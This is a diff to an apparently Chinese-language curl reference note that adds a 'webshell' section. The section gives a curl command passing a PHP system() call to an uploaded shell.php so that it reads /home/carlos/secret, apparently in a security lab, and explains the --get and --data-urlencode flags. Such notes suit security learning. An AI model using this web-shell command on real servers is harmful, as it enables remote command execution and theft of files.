@@ -200,6 +200,14 @@ curl -k https://自签名证书域名
 ```bash
 curl -x 127.0.0.1:8080 https://xxx.com
 ```
+### webshell
+
+```bash
+curl https://xxx.xxx.net/files/avatars/shell.php --get --data-urlencode "pass=system('cat /home/carlos/secret');"
+```
+- `--get`：强制使用 **GET 方法** 发送请求（即使有 `--data` 参数也用 GET，数据附在 URL 的查询字符串中）
+- `--data-urlencode`：将后面的数据进行 **URL 编码**后附加到请求中（避免特殊字符破坏 URL 格式）
+
 
 ---
 
